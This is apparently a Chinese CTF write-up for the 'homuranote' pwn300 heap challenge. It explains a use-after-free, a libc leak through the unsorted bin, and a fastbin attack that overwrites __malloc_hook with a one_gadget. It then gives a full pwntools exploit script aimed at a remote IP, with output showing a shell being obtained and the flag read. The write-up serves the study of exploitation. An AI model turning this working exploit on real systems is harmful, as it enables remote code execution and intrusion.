title: Homuranote
date: 1970-1-1
categories: 
- PWN
---
# cgctf pwn300

## 大概审查思路
- 据说这题是入门堆题,又是校队考核题目,入门一发堆吧
- 很经典的note结构,menu getnum switch-case选择功能
- checksec 查一下,能开的都开了.
- IDA打开后反编译,程序大概有5个功能,新建,删除,编辑,查看,退出
- 新建堆处很正常
- 删除堆,也就是free处,存在UAF
- 编辑处可以修改堆内的值

## 具体攻击思路
- fastbin attack劫持 \_malloc_hook_
- unsorted bin leak 程序基址
- 配合给好的libc文件进行攻击

## 具体攻击原理

### fastbin atacck
- 一般利用doublefree,但是此程序给了edit函数,而且可以UAF,所以攻击方式随意
- 此处建立起一个单向链表,只需要chunk1指向chunk2然后指向chunk1,则下一个分配的堆块,就可以在任意地点\(刚才edit写入或者doublefree后写入的\)

```python
addnote(0,"a"*0x30)#chunk 1
addnote(1,"b"*0x30)#chunk 2
free(0)
free(1)
free(0)
addnote(0,fake_chunk_add)#chunk 1
addnote(2,"a"*0x30)#chunk 2
addnote(3,"c"*0x30)#chunk 1
addnote(4,payload)#attack
```

```python
addnote(0,"a"*0x30)
free(0)
edit(0,fake_chunk_add)
addnote(0,"a"*0x30)
addnote(1,attack)
```

- 其实原理都差不多,都是利用fastbin内的内容与chunkhead之间在free和inuse时不同的布局来实现任意地址读写.

### unsorted bin leak
-  申请两个堆块后,free堆块时,假如大小范围大于max_fast,则内存空间被划分到unsorted bin中,此时,调试可知,此时堆块的指针是一起指向<main_arena+88>中的(fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc中, 通过use after free后打印出main_arena的实际地址, 结合偏移值从而得到libc的加载地址)

### OneGadget
- 寻找现成的execvl("/bin/sh"),免去构造system("/bin/sh"),但是函数执行有条件,所以要多找几个onegadget尝试一下,最后覆写\_malloc\_hook\_,在下一次malloc时,即可getshell.

# 脚本

```python
from pwn import *

#r = process("./homuranote")
r = remote("45.76.173.177",6666)
main_arena_addr = 0x397B00
mallochook=0x397af0
oneGadget=0xd694f

def addnote(s):
	r.sendline("1")
	r.sendlineafter("Size:",str(len(s)))
	r.sendlineafter("Content:",s)

def show(index):
	r.sendline("2")
	r.sendlineafter("Index:",str(index))

def edit(index,s):
	r.sendline("3")
	r.sendlineafter("Index:",str(index))
	r.sendline(s)

def delete(index):
	r.sendline("4")
	r.sendlineafter("Index:",str(index))

#leak libc

success("START leak")
addnote("a"*0x7f)
addnote("b"*0x7f)
delete(0)
show(0)
a = r.recvline()
offset = u64(a[0:6].ljust(8,"\x00")) - 88
libc_base = offset - main_arena_addr
print "libcbase: %x"%libc_base
success("SUCCESS leak")

# fastbin attack

success("START FASTBIN ATTACK")

fake_chunk=p64(libc_base + mallochook-0x20-3) + 0x58*'\x00'
padding='\x00'*(0x10+3) + p64(libc_base + oneGadget) + '\x00'*(0x58-0x10-3)

addnote("a"*0x60)
delete(2)
edit(2,fake_chunk)

addnote("c"*0x60)
addnote(padding)

success("get shell")
r.interactive()
```

```
$ ls 
[1]+  Stopped                 python exp.py
mozhucy@ubuntu:~/Desktop/kh$ python exp.py
[+] Opening connection to 45.76.173.177 on port 6666: Done
[+] START leak
libcbase: 7f9858333000
[+] SUCCESS leak
[+] START FASTBIN ATTACK
[+] get shell
[*] Switching to interactive mode
Ok,index:4.
1.add
2.show
3.edit
4.delete
5.exit
choice>>$ 1
Size:$ 2
$ ls
flag94539
$ cat flag94539
flag{R3al1y_****_h3aP_****}
$  
```